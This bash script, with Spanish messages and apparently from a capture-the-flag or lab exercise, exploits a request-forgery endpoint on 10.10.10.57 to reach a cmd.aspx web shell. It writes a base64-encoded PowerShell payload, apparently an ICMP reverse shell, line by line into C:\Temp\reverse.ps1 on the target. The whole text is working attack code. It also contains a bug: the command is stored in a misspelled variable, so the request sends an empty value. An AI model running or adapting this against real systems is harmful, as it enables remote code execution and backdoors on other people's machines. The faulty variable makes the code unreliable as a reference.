#!/bin/bash

function ctrl_c(){
  echo -e "\n\nSaliendo\n\n"
   tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

declare -r main_url="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx"

counter=0

echo; tput civis; for line in $(cat icmp.ps.b64); do 
  #echo $line
  commnad="echo $line >> C:\\Temp\\reverse.ps1"

  echo -ne "[!] Total de Lineas [$counter/87]\r"

  curl -s -X GET -G $main_url --data-urlencode "xcmd=$command" &>/dev/null

  let counter+=1
done; tput cnorm
